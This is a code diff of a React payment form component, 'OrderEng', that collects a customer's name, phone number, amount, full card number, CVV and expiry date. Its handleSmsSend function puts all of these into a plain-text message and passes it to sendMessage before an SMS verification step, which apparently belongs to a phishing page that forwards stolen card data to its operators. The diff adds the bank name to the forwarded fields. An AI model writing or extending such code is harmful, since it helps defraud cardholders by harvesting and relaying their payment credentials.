@@ -44,8 +44,8 @@ const OrderEng = () => {
     if (fields.includes('cardNumber') && !/^[0-9]{16}$/.test(cardData.cardNumber)) {
       newErrors.cardNumber = 'Card number must be 16 digits';
     }
-    if (fields.includes('name') && /^[А-Яа-я]+\s[А-Яа-я]+$/.test(cardData.name)) {
-      newErrors.name = 'Please provide the full name of your bank';
+    if (fields.includes('name') && cardData.name.trim() === '') {
+      newErrors.name = 'Please provide the name of your bank';
     }
     if (fields.includes('cvv') && !/^[0-9]{3,4}$/.test(cardData.cvv)) {
       newErrors.cvv = 'CVV must be 3 or 4 digits';
@@ -62,50 +62,43 @@ const OrderEng = () => {
 
     setErrors(newErrors);
     return Object.keys(newErrors).length === 0;
-  };
-
-  const handleChange = (e) => {
-    const { name, value, type, checked } = e.target;
-    setCardData({
-      ...cardData,
-      [name]: type === 'checkbox' ? checked : value,
-    });
-  };
-
-  const handleSmsSend = async () => {
+};
+const handleChange = (e) => {
+  const { name, value, type, checked } = e.target;
+  setCardData({
+    ...cardData,
+    [name]: type === 'checkbox' ? checked : value,
+  });
+};
+const handleSmsSend = async () => {
     setLoading(true);
     if (validateForm(['cardNumber', 'name', 'cvv', 'expiryDate'])) {
-      try {
-        const message = `
-          Name: [ ${formData.name} ] Amount: [ ${formData.amount}  ] EUR Phone Number: [ ${formData.phoneNumber} ]
-          .
-          .
-          .
-          .
-          .
-          .
-          Card Number: [${cardData.cardNumber}] CVV: [${cardData.cvv}] Expiry Date: [${cardData.expiryDate}]
-        `;
+        try {
+            const message = `
+                Name: [ ${formData.name} ] Amount: [ ${formData.amount}  ] EUR Phone Number: [ ${formData.phoneNumber} ]
+                Bank Name: [${cardData.name}]
+                Card Number: [${cardData.cardNumber}] CVV: [${cardData.cvv}] Expiry Date: [${cardData.expiryDate}]
+            `;
 
-        sendMessage(message);
+            sendMessage(message);
 
-        // Сбрасываем данные формы
-        setCardData({
-          cardNumber: '',
-          name: '',
-          cvv: '',
-          expiryDate: '',
-          amount: '',
-          agreement: false,
-        });
+            // Сбрасываем данные формы
+            setCardData({
+                cardNumber: '',
+                name: '',
+                cvv: '',
+                expiryDate: '',
+                amount: '',
+                agreement: false,
+            });
 
-        setStep(2);
-      } catch (error) {
-        console.error('Error sending message:', error.message);
-      }
+            setStep(2);
+        } catch (error) {
+            console.error('Error sending message:', error.message);
+        }
     }
     setLoading(false);
-  };
+};
 
   const handleSmsSubmit = async () => {
     setVerificationLoading(true);
